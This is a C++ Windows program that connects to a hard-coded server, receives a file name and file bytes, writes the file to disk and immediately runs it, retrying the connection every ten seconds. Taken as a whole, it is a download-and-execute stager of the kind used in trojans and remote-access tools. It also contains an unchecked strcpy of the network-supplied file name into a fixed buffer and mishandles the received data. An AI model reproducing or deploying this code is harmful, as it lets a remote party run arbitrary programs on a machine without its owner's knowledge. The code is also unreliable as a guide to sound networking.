#include <WinSock2.h>
#include <Windows.h>
#include <vector>
#include <iostream>
#include <thread>
using namespace std;

#pragma warning(disable:4996)
#pragma comment(lib, "Ws2_32.lib")

bool startup(LPTSTR lpApplicationName)
{
	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	//printf("%s, %d", lpApplicationName, lpApplicationName.size());
	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// start the program up
	if (CreateProcess(NULL,  
		lpApplicationName,        
		NULL,          
		NULL,          
		FALSE,         
		0,             
		NULL,          
		NULL,          
		&si,           
		&pi) == 0) {
		cout << "Error creating process: " << GetLastError() << endl;
		return false;
	}
	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return true;
}


void try_connect(SOCKET Socket, sockaddr_in& Addr, int delayMS) {
	// attempt connection to server
	while (connect(Socket, (sockaddr*)&Addr, sizeof(Addr)) == SOCKET_ERROR) {
		cout << "Connection failed! Reattempting.." << endl;
		// sleep for 10 seconds..
		std::this_thread::sleep_for(chrono::milliseconds(delayMS));
	}
	
	cout << "Connected to server" << endl;
}

int main() {

	SOCKET Socket;
	WSADATA Winsock;
	sockaddr_in Addr;
	int Addrlen = sizeof(Addr);

	const string server_address = "127.0.0.1";

	WSAStartup(MAKEWORD(2, 2), &Winsock);    // Start Winsock

	if (LOBYTE(Winsock.wVersion) != 2 || HIBYTE(Winsock.wVersion) != 2)    // Check version
	{
		WSACleanup();
		return 0;
	}

	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	ZeroMemory(&Addr, sizeof(Addr));    // clear the struct
	Addr.sin_family = AF_INET;    // set the address family
	Addr.sin_addr.s_addr = inet_addr(server_address.c_str());
	Addr.sin_port = htons(6000);    // set the port

	long setOpt = 1;
	setsockopt(Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&setOpt, sizeof(setOpt));

	try_connect(Socket, Addr, 10000);

	while (true) {

		bool error = false;

		long Size;
		int received = recv(Socket, (char*)&Size, sizeof(Size), 0);
		
		uint32_t dataLength;
		recv(Socket,(char*)&dataLength,sizeof(uint32_t),0);
		dataLength = ntohl(dataLength ); 
		
		std::vector<uint8_t> rcvBuf;    // Allocate a receive buffer
		rcvBuf.resize(dataLength,0x00); // with the necessary size
		
		recv(Socket,(char*)&(rcvBuf[0]),dataLength,0); // Receive the string data
		
		string fileName;                        // assign buffered data to a 
		fileName.assign((char*)&(rcvBuf[0]),rcvBuf.size());
		if (received != SOCKET_ERROR || received > 0) {

			cout << "Received file with size: " << Size << endl;

			int *Buffer = new int[Size];

			for (int i = 0; i < Size;) {
				int tempSize = (Size - i >= 1024) ? 1024 : Size - i;
				int* temp = new int[tempSize];
				if (recv(Socket, (char*)temp, tempSize * sizeof(int), 0) == SOCKET_ERROR) {
					error = true;
					cout << "Error receiving file!" << endl;
					return -1;
				}
				std::copy(temp, temp + tempSize, Buffer + i);
				i += tempSize;
			}

			char exepath[MAX_PATH];
			strcpy(exepath, fileName.c_str());
			FILE *File;
			File = fopen(exepath, "wb");
			for (int i = 0; i < Size; ++i) {
				fputc(Buffer[i], File);
			}
			fclose(File);
			LPTSTR temp = (LPTSTR)exepath;
			startup(temp);
		}
		else {
			error = true;
			cout << "Error receiving file!" << endl;
		}

		if (error) {
			try_connect(Socket, Addr, 10000);
		}
	}

	closesocket(Socket);
	WSACleanup();
	return 0;
}
